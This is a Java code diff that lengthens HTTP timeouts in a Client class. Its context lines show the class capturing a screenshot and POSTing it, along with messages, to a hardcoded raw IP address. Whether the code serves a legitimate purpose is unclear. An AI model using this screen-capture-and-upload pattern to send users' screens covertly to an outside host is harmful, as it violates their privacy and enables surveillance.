@@ -36,7 +36,7 @@ public class Client {
     public void sendMessageToCharm(String message) {
         HttpRequest request = HttpRequest.newBuilder()
             .uri(URI.create("http://188.166.162.28:8080/charm/" + message.replace(" ", "%20")))
-            .timeout(Duration.ofSeconds(30))
+            .timeout(Duration.ofMinutes(1))
             .GET()
             .build();
         try {
@@ -52,7 +52,7 @@ public class Client {
         byte[] photo = getScreenshot();
         HttpRequest request = HttpRequest.newBuilder()
             .uri(URI.create("http://188.166.162.28:8080/charm/" + message.replace(" ", "%20")))
-            .timeout(Duration.ofSeconds(30))
+            .timeout(Duration.ofMinutes(1))
             .POST(HttpRequest.BodyPublishers.ofByteArray(photo))
             .build();
         try {
